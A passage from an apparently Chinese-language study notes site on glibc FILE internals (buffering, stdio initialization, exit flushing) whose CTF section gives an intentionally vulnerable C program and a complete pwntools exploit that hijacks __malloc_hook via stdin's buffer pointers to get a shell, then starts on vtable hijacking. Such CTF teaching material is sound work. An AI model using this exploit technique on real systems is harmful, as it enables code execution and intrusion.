f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;\n      f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;\n      f-&gt;_IO_write_end = f-&gt;_IO_buf_end;\n      f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;\n\n      f-&gt;_flags |= _IO_CURRENTLY_PUTTING;\n      if (f-&gt;_mode &lt;= 0 &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))\n        f-&gt;_IO_write_end = f-&gt;_IO_write_ptr;\n    }\n  if (ch == EOF)\n    return _IO_do_write (f, f-&gt;_IO_write_base,\n                         f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);\n  if (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) /* Buffer is really full */\n    if (_IO_do_flush (f) == EOF)\n      return EOF;\n  *f-&gt;_IO_write_ptr++ = ch;\n  if ((f-&gt;_flags &amp; _IO_UNBUFFERED)\n      || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == '\\n'))\n    if (_IO_do_write (f, f-&gt;_IO_write_base,\n                      f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF)\n      return EOF;\n  return (unsigned char) ch;\n}\n</code></pre> <p>\u200b\u5b83\u4f1a\u200b\u5c1d\u8bd5\u200b\u628a\u200b\u76ee\u524d\u200b\u7f13\u51b2\u533a\u200b\u4e2d\u200b\u7684\u200b\u6570\u636e\u200b\u901a\u8fc7\u200b <code>_IO_do_write</code> \u200b\u5199\u51fa\u53bb\u200b\uff1a</p> <pre><code>static size_t\nnew_do_write (FILE *fp, const char *data, size_t to_do)\n{\n  size_t count;\n  if (fp-&gt;_flags &amp; _IO_IS_APPENDING)\n    /* On a system without a proper O_APPEND implementation,\n       you would need to sys_seek(0, SEEK_END) here, but is\n       not needed nor desirable for Unix- or Posix-like systems.\n       Instead, just indicate that offset (before and after) is\n       unpredictable. */\n    fp-&gt;_offset = _IO_pos_BAD;\n  else if (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)\n    {\n      off64_t new_pos\n        = _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, 1);\n      if (new_pos == _IO_pos_BAD)\n        return 0;\n      fp-&gt;_offset = new_pos;\n    }\n  count = _IO_SYSWRITE (fp, data, to_do);\n  if (fp-&gt;_cur_column &amp;&amp; count)\n    fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - 1, data, count) + 1;\n  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);\n  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;\n  fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= 0\n                       &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))\n                       ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);\n  return count;\n}\n</code></pre> <p>\u200b\u5b83\u4f1a\u200b\u628a\u200b\u7f13\u51b2\u533a\u200b\u4e2d\u200b\u7684\u200b\u6570\u636e\u200b\u901a\u8fc7\u200b <code>write</code> \u200b\u7cfb\u7edf\u200b\u8c03\u7528\u200b\u5199\u51fa\u53bb\u200b\uff0c\u200b\u7136\u540e\u200b\u91cd\u7f6e\u200b write \u200b\u6307\u9488\u200b\uff0c\u200b\u4f7f\u5f97\u200b buffer \u200b\u53ef\u4ee5\u200b\u88ab\u200b\u590d\u7528\u200b\u3002</p>"},{"location":"software/glibc_file.html#stdinstdoutstderr","title":"stdin/stdout/stderr \u200b\u521d\u59cb\u5316","text":"<p>stdin/stdout/stderr \u200b\u662f\u200b\u4e00\u4e2a\u200b\u521d\u59cb\u5316\u200b\u597d\u200b\u7684\u200b <code>_IO_FILE_plus</code> \u200b\u7c7b\u578b\u200b\u7684\u200b\u7ed3\u6784\u200b\u4f53\u200b\uff0c\u200b\u5176\u200b\u5b9a\u4e49\u200b\u5982\u4e0b\u200b\uff1a</p> <pre><code>#  define FILEBUF_LITERAL(CHAIN, FLAGS, FD, WDP) \\\n       { _IO_MAGIC+_IO_LINKED+_IO_IS_FILEBUF+FLAGS, \\\n         0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, (FILE *) CHAIN, FD, \\\n         0, _IO_pos_BAD, 0, 0, { 0 }, &amp;_IO_stdfile_##FD##_lock, _IO_pos_BAD,\\\n         NULL, WDP, 0 }\n# define DEF_STDFILE(NAME, FD, CHAIN, FLAGS) \\\n  static _IO_lock_t _IO_stdfile_##FD##_lock = _IO_lock_initializer; \\\n  static struct _IO_wide_data _IO_wide_data_##FD \\\n    = { ._wide_vtable = &amp;_IO_wfile_jumps }; \\\n  struct _IO_FILE_plus NAME \\\n    = {FILEBUF_LITERAL(CHAIN, FLAGS, FD, &amp;_IO_wide_data_##FD), \\\n       &amp;_IO_file_jumps};\n\nDEF_STDFILE(_IO_2_1_stdin_, 0, 0, _IO_NO_WRITES);\nDEF_STDFILE(_IO_2_1_stdout_, 1, &amp;_IO_2_1_stdin_, _IO_NO_READS);\nDEF_STDFILE(_IO_2_1_stderr_, 2, &amp;_IO_2_1_stdout_, _IO_NO_READS+_IO_UNBUFFERED);\n\nstruct _IO_FILE_plus *_IO_list_all = &amp;_IO_2_1_stderr_;\n</code></pre> <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\uff0c\u200b\u5b83\u200b\u521d\u59cb\u5316\u200b\u4e86\u200b\u8fd9\u4e9b\u200b\u5b57\u200b\u6bb5\u200b\uff1a</p> <ol> <li><code>_chain</code> \u200b\u5b57\u200b\u6bb5\u200b\uff1a\u200b\u6240\u6709\u200b\u7684\u200b <code>FILE *</code> \u200b\u6784\u6210\u200b\u4e00\u4e2a\u200b\u5355\u5411\u200b\u94fe\u8868\u200b\uff0c\u200b\u94fe\u8868\u200b\u5934\u200b\u662f\u200b <code>_IO_list_all</code>\uff0c\u200b\u521d\u59cb\u5316\u200b\u4e3a\u200b <code>_IO_list_all -&gt; _IO_2_1_stderr_ -&gt; _IO_2_1_stdout_ -&gt; _IO_2_1_stdin_</code>\uff0c\u200b\u8fd9\u4e2a\u200b\u94fe\u8868\u200b\u540e\u7eed\u200b\u7528\u200b\u5728\u200b exit \u200b\u7684\u200b\u65f6\u5019\u200b\u6e05\u7a7a\u200b\u7f13\u51b2\u533a\u200b</li> <li><code>_fileno</code> \u200b\u5b57\u200b\u6bb5\u200b\uff1astdin \u200b\u5bf9\u5e94\u200b FD 0\uff0cstdout \u200b\u5bf9\u5e94\u200b FD 1\uff0cstderr \u200b\u5bf9\u5e94\u200b FD 2</li> <li><code>_flags</code> \u200b\u5b57\u200b\u6bb5\u200b\uff1a\u200b\u8bbe\u7f6e\u200b\u4e3a\u200b <code>_IO_MAGIC | _IO_LINKED | _IO_IS_FILEBUF</code> \u200b\u52a0\u200b\u989d\u5916\u200b\u7684\u200b flags\uff0cstdin \u200b\u989d\u5916\u200b\u8bbe\u7f6e\u200b <code>_IO_NO_WRITES</code> \u200b\u8868\u793a\u200b\u4e0d\u53ef\u200b\u5199\u200b\uff0cstdout \u200b\u548c\u200b stderr \u200b\u989d\u5916\u200b\u8bbe\u7f6e\u200b <code>_IO_NO_READS</code> \u200b\u8868\u793a\u200b\u4e0d\u53ef\u200b\u8bfb\u200b\uff0cstderr \u200b\u8fd8\u200b\u989d\u5916\u200b\u8bbe\u7f6e\u200b\u4e86\u200b <code>_IO_UNBUFFERED</code> \u200b\u8868\u793a\u200b\u4e0d\u200b\u505a\u200b\u7f13\u51b2\u200b</li> <li>\u200b\u5176\u4f59\u90e8\u5206\u200b\u5c31\u662f\u200b\u521d\u59cb\u5316\u200b <code>lock</code>\u3001<code>vtable</code> \u200b\u548c\u200b <code>wide_data</code>\uff0c\u200b\u7136\u540e\u200b\u628a\u200b offset \u200b\u8bbe\u7f6e\u200b\u4e3a\u200b <code>_IO_pos_BAD</code></li> </ol> <p>\u200b\u5199\u200b\u4e00\u6bb5\u200b\u7a0b\u5e8f\u200b\u901a\u8fc7\u200b\u904d\u5386\u200b <code>_IO_list_all</code> \u200b\u6765\u200b\u6253\u5370\u200b\u51fa\u200b\u6240\u6709\u200b\u7684\u200b <code>FILE *</code> \u200b\u7ed3\u6784\u200b\u4f53\u200b\uff1a</p> <pre><code>#include &lt;stdint.h&gt;\n#include &lt;stdio.h&gt;\n\nstruct _IO_FILE_plus {\n  FILE file;\n  void *vtable;\n};\n\nint main() {\n  // offset obtained by objdump -T /lib/x86_64-linux-gnu/libc.so.6 | grep\n  // _IO_2_1_stdin_\n  uint8_t *libc_base = (uint8_t *)stdin - 0x1ec980;\n\n  // offset obtained by objdump -T /lib/x86_64-linux-gnu/libc.so.6 | grep\n  // _IO_list_all\n  struct _IO_FILE_plus **list_all =\n      (struct _IO_FILE_plus **)(libc_base + 0x1ed5a0);\n\n  printf(\"stdin is %p\\n\", stdin);\n  printf(\"stdout is %p\\n\", stdout);\n  printf(\"stderr is %p\\n\", stderr);\n  FILE *fp = fopen(\"log\", \"w\");\n  fprintf(fp, \"Hello, world!\");\n  printf(\"fp is %p\\n\", fp);\n\n  FILE *file = &amp;(*list_all)-&gt;file;\n  while (file) {\n    printf(\"Found FILE * at %p, fd is %d\\n\", file, file-&gt;_fileno);\n    file = file-&gt;_chain;\n  }\n  return 0;\n}\n</code></pre> <p>\u200b\u8f93\u51fa\u200b\u7b26\u5408\u200b\u9884\u671f\u200b\uff1a</p> <pre><code>stdin is 0x7f64e53f7980\nstdout is 0x7f64e53f86a0\nstderr is 0x7f64e53f85c0\nfp is 0x5650ba3846b0\nFound FILE * at 0x5650ba3846b0, fd is 3\nFound FILE * at 0x7f64e53f85c0, fd is 2\nFound FILE * at 0x7f64e53f86a0, fd is 1\nFound FILE * at 0x7f64e53f7980, fd is 0\n</code></pre>"},{"location":"software/glibc_file.html#flush","title":"\u7a0b\u5e8f\u200b\u9000\u51fa\u200b\u65f6\u200b flush \u200b\u7f13\u51b2\u533a","text":"<p>\u200b\u7f16\u7a0b\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5982\u679c\u200b\u770b\u4e0d\u5230\u200b printf \u200b\u6253\u5370\u200b\u7684\u200b\u5185\u5bb9\u200b\uff0c\u200b\u53ef\u80fd\u200b\u662f\u56e0\u4e3a\u200b\u5b83\u200b\u7684\u200b\u6570\u636e\u200b\u5199\u5165\u200b\u4e86\u200b\u7f13\u51b2\u533a\u200b\uff0c\u200b\u4f46\u662f\u200b\u56e0\u4e3a\u200b\u7a0b\u5e8f\u200b\u6ca1\u6709\u200b\u6b63\u5e38\u200b\u9000\u51fa\u200b\uff0c\u200b\u6240\u4ee5\u200b\u6ca1\u6709\u200b flush \u200b\u51fa\u6765\u200b\u3002\u200b\u90a3\u200b\u4e5f\u5c31\u662f\u8bf4\u200b\uff0c\u200b\u5982\u679c\u200b\u7a0b\u5e8f\u200b\u6b63\u5e38\u200b\u9000\u51fa\u200b\uff0cglibc \u200b\u4f1a\u200b\u81ea\u52a8\u200b\u8fdb\u884c\u200b flush \u200b\u64cd\u4f5c\u200b\u3002\u200b\u5176\u200b\u673a\u5236\u200b\u662f\u200b\uff0clibc \u200b\u5728\u200b\u7ed3\u675f\u200b\u8fdb\u7a0b\u200b\u524d\u200b\uff0c\u200b\u4f1a\u200b\u8c03\u7528\u200b <code>_IO_cleanup</code> \u200b\u51fd\u6570\u200b\u628a\u200b\u7f13\u51b2\u533a\u200b\u5185\u200b\u7684\u200b\u6570\u636e\u200b flush \u200b\u51fa\u53bb\u200b\uff1a</p> <pre><code>text_set_element(__libc_atexit, _IO_cleanup);\n\nint\n_IO_cleanup (void)\n{\n  int result = _IO_flush_all_lockp (0);\n\n  /* omitted */\n\n  return result;\n}\n</code></pre> <p>\u200b\u5b83\u200b\u8c03\u7528\u200b\u7684\u200b <code>_IO_flush_all_lockp</code> \u200b\u51fd\u6570\u200b\u4f1a\u200b\u904d\u5386\u200b <code>_IO_list_all</code> \u200b\u94fe\u8868\u200b\uff0c\u200b\u68c0\u67e5\u200b\u5b83\u200b\u662f\u5426\u200b\u9700\u8981\u200b flush\uff1a</p> <pre><code>int\n_IO_flush_all_lockp (int do_lock)\n{\n  int result = 0;\n  FILE *fp;\n\n  /* omitted */\n\n  for (fp = (FILE *) _IO_list_all; fp != NULL; fp = fp-&gt;_chain)\n    {\n      run_fp = fp;\n      if (do_lock)\n        _IO_flockfile (fp);\n\n      if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)\n           || (_IO_vtable_offset (fp) == 0\n               &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr\n                                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))\n           )\n          &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)\n        result = EOF;\n\n      if (do_lock)\n        _IO_funlockfile (fp);\n      run_fp = NULL;\n    }\n\n  /* omitted */\n\n  return result;\n}\n</code></pre> <p>\u200b\u8fd9\u91cc\u200b\u7684\u200b <code>_IO_OVERFLOW</code> \u200b\u51fd\u6570\u200b\u4f1a\u200b\u628a\u200b\u7f13\u51b2\u533a\u200b\u5185\u200b\u7684\u200b\u6570\u636e\u200b\u901a\u8fc7\u200b write syscall \u200b\u8f93\u51fa\u200b\u3002</p>"},{"location":"software/glibc_file.html#ctf","title":"CTF","text":""},{"location":"software/glibc_file.html#stdin-_io_buf_base","title":"\u4fee\u6539\u200b <code>stdin-&gt;_IO_buf_base</code> \u200b\u4ee5\u200b\u5b9e\u73b0\u200b\u4efb\u610f\u200b\u5730\u5740\u200b\u5199","text":"<p>\u200b\u4e0b\u9762\u200b\u6f14\u793a\u200b\u5982\u4f55\u200b\u5229\u7528\u200b\u4e00\u4e2a\u200b\u4efb\u610f\u200b\u5730\u5740\u200b\u7684\u200b\u4e24\u200b\u5b57\u8282\u200b\u5199\u200b\uff0c\u200b\u5728\u200b\u4e00\u4e2a\u200b\u53ef\u4ee5\u200b\u64cd\u63a7\u200b\u7684\u200b getchar/scanf \u200b\u8c03\u7528\u200b\u4e14\u200b\u5916\u52a0\u200b\u53ef\u63a7\u200b size \u200b\u7684\u200b malloc \u200b\u7684\u200b\u7a0b\u5e8f\u200b\u4e2d\u200b\u5b9e\u73b0\u200b get shell\uff1a</p> <p>\u200b\u88ab\u200b\u653b\u51fb\u200b\u7684\u200b\u7a0b\u5e8f\u200b\uff1a</p> <pre><code>#include &lt;stdint.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n\nint main() {\n  // offset obtained by objdump -T /lib/x86_64-linux-gnu/libc.so.6 | grep\n  // _IO_2_1_stdin_\n  uint8_t *libc_base = (uint8_t *)stdin - 0x1ec980;\n\n  // unbuffered i/o: _IO_buf_base points to _shortbuf\n  setvbuf(stdin, NULL, _IONBF, 0);\n  setvbuf(stdout, NULL, _IONBF, 0);\n  setvbuf(stderr, NULL, _IONBF, 0);\n\n  // leak address to ease attack\n  printf(\"libc base is at %p\\n\", libc_base);\n\n  int num_actions = 0;\n  printf(\"input number of actions:\\n\");\n  scanf(\"%d\", &amp;num_actions);\n  printf(\"input actions (1 for echo, 2 for random write):\\n\");\n  int *actions = (int *)malloc(sizeof(int) * num_actions);\n  for (int i = 0; i &lt; num_actions; i++) {\n    scanf(\"%d\", &amp;actions[i]);\n  }\n  size_t malloc_size;\n  printf(\"input malloc size:\\n\");\n  scanf(\"%zu\", &amp;malloc_size);\n\n  for (int i = 0; i &lt; num_actions; i++) {\n    int action = actions[i];\n    printf(\"action is %d\\n\", action);\n    printf(\"read remain size is %ld\\n\",\n           stdin-&gt;_IO_read_end - stdin-&gt;_IO_read_ptr);\n    printf(\"buffer from %p to %p\\n\", stdin-&gt;_IO_buf_base, stdin-&gt;_IO_buf_end);\n    if (action == 1) {\n      // echo\n      int ch = getchar();\n      printf(\"echo: %d\\n\", ch);\n    } else if (action == 2) {\n      uint16_t *addr;\n      unsigned int data;\n      printf(\"input address and data:\\n\");\n      if (scanf(\"%p%d\", &amp;addr, &amp;data) != 2) {\n        printf(\"invalid input\\n\");\n        continue;\n      }\n\n      data = (uint16_t)data;\n\n      printf(\"write #%d: write 0x%x to %p\\n\", i, data, addr);\n      *addr = data;\n    }\n  }\n\n  // trigger system(\"/bin/sh\")\n  void *p = malloc(malloc_size);\n  return 0;\n}\n</code></pre> <p>\u200b\u5b83\u200b\u9996\u5148\u200b\u8bfb\u53d6\u200b\u4e00\u7cfb\u5217\u200b\u7684\u200b\u64cd\u4f5c\u200b\u548c\u200b\u6700\u540e\u200b malloc \u200b\u7684\u200b size\uff0c\u200b\u7136\u540e\u200b\u6309\u7167\u200b\u64cd\u4f5c\u200b\u8c03\u7528\u200b getchar \u200b\u6216\u8005\u200b scanf\uff0c\u200b\u5176\u4e2d\u200b scanf \u200b\u5f97\u5230\u200b\u7684\u200b\u5730\u5740\u200b\u53ef\u4ee5\u200b\u5bf9\u200b\u4efb\u610f\u200b\u5730\u5740\u200b\u8fdb\u884c\u200b\u4e24\u200b\u5b57\u8282\u200b\u7684\u200b\u5199\u200b\u3002\u200b\u5bf9\u5e94\u200b\u7684\u200b\u5229\u7528\u200b\u8fc7\u7a0b\u200b\u5982\u4e0b\u200b\uff1a</p> <ol> <li>\u200b\u4e3a\u4e86\u200b\u7b80\u5355\u200b\uff0c\u200b\u7a0b\u5e8f\u200b\u76f4\u63a5\u200b\u628a\u200b libc \u200b\u7684\u200b base \u200b\u6253\u5370\u200b\u4e86\u200b\u51fa\u6765\u200b\uff0c\u200b\u5047\u8bbe\u200b\u653b\u51fb\u8005\u200b\u5df2\u7ecf\u200b\u83b7\u53d6\u200b\u5230\u200b\u4e86\u200b libc \u200b\u7684\u200b\u57fa\u200b\u5730\u5740\u200b</li> <li>\u200b\u6839\u636e\u200b\u4efb\u610f\u200b\u5730\u5740\u200b\u4e24\u200b\u5b57\u8282\u200b\u5199\u200b\uff0c\u200b\u628a\u200b stdin \u200b\u7684\u200b _IO_buf_base \u200b\u6307\u5411\u200b\u5b83\u200b\u81ea\u5df1\u200b\u4e5f\u200b\u5c31\u662f\u200b <code>&amp;_IO_buf_base</code>\uff08\u200b\u521d\u59cb\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0c\u200b\u5b83\u200b\u6307\u5411\u200b <code>_IO_2_1_stdin</code> \u200b\u7684\u200b <code>_shortbuf</code> \u200b\u5b57\u200b\u6bb5\u200b\uff0c\u200b\u548c\u200b <code>&amp;_IO_buf_base</code> \u200b\u53ea\u6709\u200b\u6700\u4f4e\u200b\u4e24\u200b\u5b57\u8282\u200b\u4e0d\u540c\u200b\uff09</li> <li>\u200b\u5229\u7528\u200b <code>scanf</code> \u200b\u89e6\u53d1\u200b <code>read(fd, _IO_buf_base, _IO_buf_end - _IO_buf_size)</code> \u200b\u7cfb\u7edf\u200b\u8c03\u7528\u200b\uff0c\u200b\u5f80\u200b <code>&amp;_IO_buf_base</code> \u200b\u5199\u5165\u200b 16 \u200b\u5b57\u8282\u200b\u6570\u636e\u200b\uff0c\u200b\u8986\u76d6\u200b\u6389\u200b <code>_IO_buf_base</code> \u200b\u548c\u200b <code>_IO_buf_end</code> \u200b\u7684\u200b\u53d6\u503c\u200b\uff1a\u200b\u8bbe\u7f6e\u200b <code>_IO_buf_base</code> \u200b\u4e3a\u200b <code>__malloc_hook</code>\uff0c\u200b\u8bbe\u7f6e\u200b <code>_IO_buf_end</code> \u200b\u4e3a\u200b <code>__malloc_hook + 8</code>\uff0c\u200b\u4fdd\u8bc1\u200b <code>_IO_buf_base &lt; _IO_buf_end</code></li> <li>\u200b\u4e0a\u200b\u4e00\u6b21\u200b\u8c03\u7528\u200b\u8fc7\u540e\u200b\uff0c<code>_IO_read_ptr</code> \u200b\u7b49\u4e8e\u200b <code>&amp;_IO_buf_base</code>\uff0c<code>_IO_read_end</code> \u200b\u7b49\u4e8e\u200b <code>_IO_read_ptr + 16</code>\uff1b\u200b\u8c03\u7528\u200b 16 \u200b\u6b21\u200b getchar\uff0c\u200b\u4f7f\u5f97\u200b <code>_IO_read_ptr == _IO_read_end</code></li> <li>\u200b\u5229\u7528\u200b <code>scanf</code> \u200b\u518d\u6b21\u200b\u89e6\u53d1\u200b <code>read(fd, _IO_buf_base, _IO_buf_end - _IO_buf_size)</code> \u200b\u7cfb\u7edf\u200b\u8c03\u7528\u200b\uff0c\u200b\u5f80\u200b <code>_IO_buf_base</code> \u200b\u4e5f\u200b\u5c31\u662f\u200b <code>__malloc_hook</code> \u200b\u5199\u5165\u200b 8 \u200b\u5b57\u8282\u200b\u6570\u636e\u200b\uff1a\u200b\u8bbe\u7f6e\u200b <code>__malloc_hook</code> \u200b\u4e3a\u200b <code>system</code></li> <li>\u200b\u6700\u540e\u200b\u5229\u7528\u200b\u5df2\u6709\u200b\u7684\u200b <code>malloc(size)</code> \u200b\u8c03\u7528\u200b\uff0c\u200b\u628a\u200b <code>size</code> \u200b\u8bbe\u7f6e\u200b\u4e3a\u200b <code>/bin/sh</code> \u200b\u5b57\u7b26\u4e32\u200b\u7684\u200b\u5730\u5740\u200b\uff0c\u200b\u7531\u4e8e\u200b <code>__malloc_hook</code> \u200b\u6b64\u65f6\u200b\u5df2\u7ecf\u200b\u6307\u5411\u200b\u4e86\u200b <code>system</code>\uff0c\u200b\u6240\u4ee5\u200b <code>malloc(\"/bin/sh\")</code> \u200b\u4f1a\u200b\u8c03\u7528\u200b <code>system(\"/bin/sh\")</code> \u200b\u5b9e\u73b0\u200b get shell</li> </ol> <p>\u200b\u5229\u7528\u200b\u4ee3\u7801\u200b\u5982\u4e0b\u200b\uff1a</p> <pre><code>from pwn import *\n\ncontext(os=\"linux\", arch=\"amd64\", log_level=\"debug\", terminal=[\"tmux\", \"splitw\", \"-h\"])\np = process(\"./random_write\")\n\n# read libc base address from the program\nline = p.recvline().decode(\"utf-8\")\nlibc_base = int(line.split(\" \")[-1], 16)\n\n# prepare actions:\n# step 1([\"2\"]): override _IO_buf_base to point to itself\n# step 2([\"2\"]): override _IO_buf_base to point to __malloc_hook and _IO_buf_end to __malloc_hook+8\n# step 3([\"1\"]*16): increment _IO_read_ptr until it equals to _IO_read_end\n# step 4([\"2\"]): trigger sys_read to write one_gadget to __malloc_hook variable\np.recvuntil(b\"input number of action\")\nactions = [\"2\"] + [\"2\"] + [\"1\"] * 16 + [\"2\"]\np.sendline(f\"{len(actions)}\".encode(\"utf-8\"))\np.recvuntil(b\"input actions\")\np.sendline(\" \".join(actions).encode(\"utf-8\"))\n\n# send address of \"/bin/sh\" as malloc size\n# obtained by decompiling system()\np.recvuntil(b\"input malloc size\")\nbin_sh = libc_base + 0x1B45BD\np.sendline(f\"{bin_sh}\".encode(\"utf-8\"))\n\n# initially _IO_buf_base points to stdin._shortbuf,\n# which is stdin + 0x83, i.e. libc_base + 0x1ECA03.\n# override the lowest two bytes of stdin._IO_buf_base to 0xC9B8\n# then _IO_buf_base points to libc_base + 0x1EC9B8, which is _IO_buf_base itself\n# obtained via objdump -T /lib/x86_64-linux-gnu/libc.so.6 | grep __IO_2_1_stdin\nstdin = libc_base + 0x1EC980\nstdin_io_buf_base = stdin + 0x38  # offsetof(struct _IO_FILE, _IO_buf_base)\np.recvuntil(b\"input address and data\")\np.sendline(f\"0x{stdin_io_buf_base:x} {stdin_io_buf_base &amp; 0xFFFF}\".encode(\"utf-8\"))\n\n# now _IO_buf_base points to itself,\n# write __malloc_hook to _IO_buf_base and\n# __malloc_hook+8 to _IO_buf_end.\n# this is required _IO_buf_base must be smaller than _IO_buf_end.\n# obtained via objdump -T /lib/x86_64-linux-gnu/libc.so.6 | grep malloc_hook\nmalloc_hook = libc_base + 0x1ECB70\np.recvuntil(b\"input address and data\")\np.send(p64(malloc_hook) + p64(malloc_hook + 8))\n\n# now _IO_read_ptr points to libc_base + 0x1EC9B8,\n# _IO_read_end points to libc_base + 0x1EC9C8,\n# we want them to become equal to read more data into _IO_buf_base,\n# the _IO_read_ptr pointer is incremented 16 times via getchar().\n\n# override __malloc_hook to system\n# obtained via objdump -T /lib/x86_64-linux-gnu/libc.so.6 | grep system\nsystem = libc_base + 0x52290\np.recvuntil(b\"input address and data\")\np.sendline(p64(system))\n\n# waiting for shell\np.sendline(b\"whoami &amp;&amp; id\")\np.interactive()\n</code></pre>"},{"location":"software/glibc_file.html#_3","title":"\u63a7\u5236\u6d41\u200b\u52ab\u6301","text":"<p>\u200b\u524d\u9762\u200b\u63d0\u5230\u200b\uff0clibc \u200b\u5728\u200b\u7ed3\u675f\u200b\u8fdb\u7a0b\u200b\u524d\u200b\uff0c\u200b\u4f1a\u200b\u904d\u5386\u200b <code>_IO_list_all</code> \u200b\u94fe\u8868\u200b\uff0c\u200b\u6bcf\u4e2a\u200b FILE \u200b\u7684\u200b\u7f13\u51b2\u533a\u200b\u662f\u5426\u200b\u8fd8\u6709\u200b\u5185\u5bb9\u200b\uff1a\u200b\u5982\u679c\u200b\u68c0\u67e5\u200b <code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code> \u200b\u6216\u8005\u200b <code>_IO_vtable_offset (fp) == 0 &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</code> \u200b\u6210\u7acb\u200b\uff0c\u200b\u5c31\u200b\u8bf4\u660e\u200b\u8fd8\u6709\u200b\u6570\u636e\u200b\u6ca1\u6709\u200b\u901a\u8fc7\u200b write syscall \u200b\u5199\u51fa\u53bb\u200b\uff0c\u200b\u8fd9\u65f6\u5019\u200b\u5c31\u200b\u4f1a\u200b\u8c03\u7528\u200b overflow hook \u200b\u51fd\u6570\u200b\u6765\u200b\u505a\u200b\u8fd9\u4ef6\u200b\u4e8b\u60c5\u200b\u3002overflow hook \u200b\u672c\u8eab\u200b\u4fdd\u5b58\u200b\u5728\u200b vtable \u200b\u4e2d\u200b\uff0c\u200b\u800c\u200b vtable \u200b\u53d7\u5230\u200b\u4e86\u200b\u4fdd\u62a4\u200b\uff0c\u200b\u5728\u200b <code>IO_validate_vtable</code> \u200b\u51fd\u6570\u200b\u4e2d\u200b\u68c0\u67e5\u200b\u5b83\u200b\u662f\u5426\u200b\u5408\u6cd5\u200b\uff0c\u200b\u5373\u200b\u662f\u5426\u200b\u4e3a\u200b glibc \u200b\u81ea\u5e26\u200b\u7684\u200b vtable\uff0c\u200b\u6b64\u65f6\u200b\u5982\u679c\u200b\u7528\u200b\u81ea\u5df1\u200b\u6784\u9020\u200b\u7684\u200b vtable\uff0c\u200b\u5c31\u200b\u4f1a\u200b\u51fa\u73b0\u200b <code>Fatal error: glibc detected an invalid stdio handle</code> \u200b\u9519\u8bef\u200b\u3002</p> <p>\u200b\u867d\u7136\u200b\u4e0d\u80fd\u200b\u7528\u200b glibc \u200b\u4ee5\u5916\u200b\u7684\u200b vtable\uff0c\u200b\u4f46\u200b\u8fd9\u65f6\u5019\u200b\u53ef\u4ee5\u200b\u5229\u7528\u200b glibc \u200b\u81ea\u5e26\u200b\u7684\u200b\u53e6\u200b\u4e00\u4e2a\u200b vtable\uff1a<code>IO_wfile_jumps</code>\uff0c\u200b\u5b83\u200b\u7684\u200b <code>overflow</code> \u200b\u51fd\u6570\u200b\u6307\u5411\u200b\u4e86\u200b <code>_IO_wfile_overflow</code>\uff1a</p> <pre><code>const struct _IO_jump_t _IO_wfile_jumps libio_vtable =\n{\n  JUMP_INIT_DUMMY,\n  JUMP_INIT(finish, _IO_new_file_finish),\n  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wfile_overflow),\n  /* omitted */\n};\n</code></pre> <p>\u200b\u800c\u200b <code>_IO_wfile_overflow</code> \u200b\u51fd\u6570\u200b\u5728\u200b\u4e00\u4e9b\u200b\u6761\u4ef6\u200b\u4e0b\u4f1a\u200b\u8c03\u7528\u200b <code>_IO_wdoallocbuf</code>\uff1a</p> <pre><code>wint_t\n_IO_wfile_overflow (FILE *f, wint_t wch)\n{\n  if (f-&gt;_flags &amp; _IO_NO_WRITES)\n    {\n      /* omitted */\n      return WEOF;\n    }\n  if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0)\n    {\n      if (f-&gt;_wide_data-&gt;_IO_write_base == 0)\n        {\n          _IO_wdoallocbuf (f);\n          /* omitted */\n        }\n    }\n  /* omitted */\n}\n</code></pre> <p><code>_IO_wallocbuf</code> \u200b\u8fdb\u800c\u200b\u4f1a\u200b\u8c03\u7528\u200b <code>_IO_WDOALLOCATE</code>\uff1a</p> <pre><code>void\n_IO_wdoallocbuf (FILE *fp)\n{\n  if (fp-&gt;_wide_data-&gt;_IO_buf_base)\n    return;\n  if (!(fp-&gt;_flags &amp; _IO_UNBUFFERED))\n    if ((wint_t)_IO_WDOALLOCATE (fp) != WEOF)\n      return;\n  /* omitted */\n}\n</code></pre> <p><code>_IO_WDOALLOCATE</code> \u200b\u88ab\u200b\u5b9a\u4e49\u200b\u4e3a\u200b\uff1a</p> <pre><code>#define _IO_WDOALLOCATE(FP) WJUMP0 (__doallocate, FP)\n#define WJUMP0(FUNC, THIS) (_IO_WIDE_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS)\n#define _IO_WIDE_JUMPS_FUNC(THIS) _IO_WIDE_JUMPS(THIS)\n#define _IO_WIDE_JUMPS(THIS) \\\n  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, 